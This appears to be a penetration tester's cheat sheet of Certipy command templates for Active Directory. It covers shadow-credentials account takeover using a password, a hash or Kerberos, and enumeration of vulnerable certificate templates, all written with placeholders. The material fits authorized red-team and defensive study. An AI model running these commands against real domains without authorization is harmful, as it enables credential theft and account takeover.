# certipy
#active-directory

## Shadow cred
```
certipy shadow auto -u '<user>'@<domain> -p '<passwd>' -account '<target_user>'
```

## Shadow cred [Hash]
```
certipy shadow auto -u '<user>'@<domain> -hashes '<hash>' -account '<target_user>'
```

## Shadow cred using kerberos
```
certipy shadow auto -u '<user>'@<domain> -p '<passwd>' -account '<target_user>' -k -target <target>
```

## Enumerate vulnerable certificate templates
```
certipy find -vulnerable -u '<user>'@<domain> -p '<passwd>' -dc-ip <ip> -stdout
```

## Enumerate enabled certificate templates
```
certipy find -enabled -u '<user>'@<domain> -p '<passwd>' -dc-ip <ip> -stdout
```
